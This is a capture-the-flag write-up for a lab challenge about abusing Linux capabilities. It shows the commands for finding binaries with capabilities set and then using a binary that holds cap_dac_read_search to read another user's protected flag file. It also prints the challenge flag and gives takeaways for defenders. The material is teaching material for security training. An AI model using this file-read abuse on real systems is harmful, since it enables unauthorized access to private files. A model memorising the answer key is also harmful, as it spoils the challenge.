# BINARY-01: Capability Binary Abuse — Writeup

## Overview
- **Points:** 350
- **Difficulty:** Medium-Hard
- **Type:** Binary Exploitation (Linux Capabilities)
- **Status:** REAL

## Scenario

You have a shell as `analyst`. Enumerate the system for binaries with dangerous Linux capabilities that could allow privilege escalation or unauthorized file access.

## Enumeration

```bash
# Search for binaries with capabilities set
getcap -r / 2>/dev/null
```

Output reveals:

```
/usr/local/bin/log_reader cap_dac_read_search=ep
```

The `cap_dac_read_search` capability allows a process to **bypass file read permission checks and directory read/execute permission checks**. This means `log_reader` can read any file on the system regardless of ownership or permissions.

### Understanding the Capability

- `cap_dac_read_search` — Bypass file read permission checks and directory read+execute permission checks
- `=ep` — The capability is both **effective** (active) and **permitted** (allowed to be used)
- Unlike SUID, capabilities are fine-grained; this binary doesn't run as another user, it just gains the specific read-bypass privilege

### Optional: Inspect the Binary

```bash
# Check what the binary does
/usr/local/bin/log_reader --help
# Output: Usage: /usr/local/bin/log_reader <logfile>

# Also check /opt/tools/README.txt for a hint about the tool
cat /opt/tools/README.txt
```

## Exploitation

Since `log_reader` can read any file, target the engineer user's home directory:

```bash
# List engineer's home (may fail without dir capabilities, but we can guess)
ls -la /home/engineer/

# Read the flag directly
/usr/local/bin/log_reader /home/engineer/.flag_binary01
```

## Getting the Flag

```bash
/usr/local/bin/log_reader /home/engineer/.flag_binary01
```

**Flag:** `FLAG{t2_c4p_d4c_r34d_4bus3_x7k}`

## Key Takeaways

- Linux capabilities are a finer-grained alternative to SUID/SGID bits
- `cap_dac_read_search` is extremely dangerous — it allows reading ANY file
- Always enumerate capabilities with `getcap -r / 2>/dev/null` during privilege escalation
- Even "innocent" utilities become dangerous when given excessive capabilities

## References

- `man 7 capabilities` — Linux capabilities overview
- https://gtfobins.github.io/ — GTFOBins capability abuse
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
- `man getcap` / `man setcap` — Capability tools
